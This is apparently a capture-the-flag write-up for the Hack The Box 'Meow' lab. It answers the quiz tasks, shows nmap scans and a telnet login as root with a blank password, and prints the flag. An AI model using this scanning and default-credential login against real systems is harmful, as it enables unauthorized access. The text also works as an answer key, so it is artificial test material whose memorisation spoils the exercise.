# [Hack The Box] Starting Point : Meow

After launched the target machine, we can answer to first questions :

- **Task 1:**  What does the acronym VM stand for? 
    > Answer : Virtual Machine
- **Task 2:**  What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.
    > Answer : Terminal
- **Task 3:**   What service do we use to form our VPN connection into HTB labs? 
    > Answer : openvpn

- **Task 4:**   What tool do we use to test our connection to the target with an ICMP echo request? 
    > Answer : ping

- **Task 5:**    What is the name of the most common tool for finding open ports on a target? 
    > Answer : nmap

To answer the task 5 question, we need to run a nmap scan to know wich service are running the target machine. 

```bash
$ nmap -A 10.129.147.174

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- -A : to do a thorough scan

And a second to check if we didn't forget to check a port.

```bash
$ nmap -p- -T4 10.129.147.174
```
- -p- : check all ports 
- -T4 : aggressive scan (rapid scan) but easy to detect for IDS/IPS


As we can see, we have only one service running on port 23. The telnet service is a network protocol commonly used to establish a connection between two machines.

- **Task 6:**  What service do we identify on port 23/tcp during our scans? 
    > Answer : Telnet

```bash
$ telnet 10.129.147.174 --p 23
Trying 10.129.147.174...
Connected to 10.129.147.174.
Escape character is '^]'.


  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

When we attempt to etablish a connection the target ask ourself for a username. 
It exist few common and interesting username to try : 
- admin
- administrator
- root

When we enter the `root` username we have access to a root console : 

-**Task 7:**  What username is able to log into the target over telnet with a blank password? 
> Answer: root

```bash
root@Meow:~$ ls
flag.txt  snap
root@Meow:~$ cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

-**Submit Flag:** 
> Answer: b40abdfe23665f766f9c61ecba8a4c19



